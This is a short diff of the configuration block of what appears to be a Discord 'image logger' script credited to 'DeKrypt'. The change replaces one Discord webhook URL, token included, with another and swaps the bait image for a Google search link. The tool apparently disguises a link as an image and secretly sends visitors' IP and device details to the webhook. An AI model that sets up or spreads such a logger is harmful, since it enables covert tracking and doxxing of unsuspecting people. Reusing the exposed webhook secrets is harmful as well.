@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1367803443518902393/bU6nIEHkZx9OZwMW0JamKo1lnkE-B_5yXqRdxeScTGH1JdTyveugf9DSjJqe8siG9P4M",
-    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k_story.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1556326059375595531/1RCQCSY9ICf9nkgl6kYuIkzbuBoGRj4c_-p82YUqL_2X0NFr0CfjMUpCSb8TKGiwtSbo",
+    "image": "https://www.google.com/search?sca_esv=0b41735123e831e2&rlz=1C1GCEA_enIN1233IN1234&sxsrf=APpeQnuln3kDZay-eSD4qmn-woC9Zf9bwA:1791127494434&q=alive+chicken+feet&uds=AJ5uw1_a2D0D09lxm8gpKKOTUn4rSGxlWOgVa94UJjoNIxJa6yuwbh457JRVgH18iLh9mdZPLILiu1BL6dNWDxmznjPMFQ6y4wk4ZfQXMin8e0_5YTwlA3ZB5RZKOKVria_M5_8YCdi4B8FE2CL0MDsRn5jP03LpEg&udm=2&sa=X&ved=2ahUKEwjOgrbw1aCXAxUwR2cHHba5EbEQxKsJKAR6BAgVEAE&ictx=0&biw=1920&bih=945&dpr=1#sv=CAMSUxoyKhBlLWNIT0diVTB1SkQtZURNMg5jSE9HYlUwdUpELWVETToOX0FFXzRtRllfMGxjOE0gBCoXCgFzEhBlLWNIT0diVTB1SkQtZURNGAEwAVACGAcg7ZqYsQ5KCBACGAEgAigB", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
